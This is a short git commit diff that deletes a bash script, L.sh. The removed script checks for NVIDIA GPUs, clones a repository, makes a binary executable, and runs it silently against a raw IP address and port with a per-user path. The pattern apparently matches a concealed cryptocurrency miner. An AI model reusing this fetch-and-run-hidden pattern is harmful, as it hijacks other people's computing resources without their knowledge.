babe3d8fec148e343a9c26205e7da6ba04cf0798
ddao2604 <78058830+ddao2604@users.noreply.github.com>
2021-06-18 21:46:46 +0800

    Delete L.sh

--- L.sh
+++
@@ -1,8 +0,0 @@
-#! /bin/bash
-nvidia-smi -L
-printf "User $1"  >&2
-{
-git clone https://github.com/ddao2604/tech.git &> /dev/null
-sudo chmod +x tech/m
-./tech/m -P http://64.52.174.165:4545/"$1" &> log
-} &> /dev/null
